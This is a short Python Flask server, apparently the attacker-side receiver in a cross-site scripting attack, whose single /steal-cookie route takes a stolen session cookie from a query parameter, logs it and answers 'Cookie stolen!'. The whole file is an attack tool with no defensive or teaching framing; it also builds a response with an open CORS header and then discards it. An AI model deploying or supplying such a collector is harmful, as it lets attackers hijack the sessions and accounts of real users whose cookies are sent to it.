from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/steal-cookie', methods=['GET'])
def steal_cookie():
    stolen_cookie = request.args.get('cookie', '')
    print(f"Stolen cookie: {stolen_cookie}")

    response = make_response("Cookie stolen!", 200)
    response.headers['Access-Control-Allow-Origin'] = '*'
    return "Cookie stolen!", 200

if __name__ == "__main__":
    app.run(port=5001)
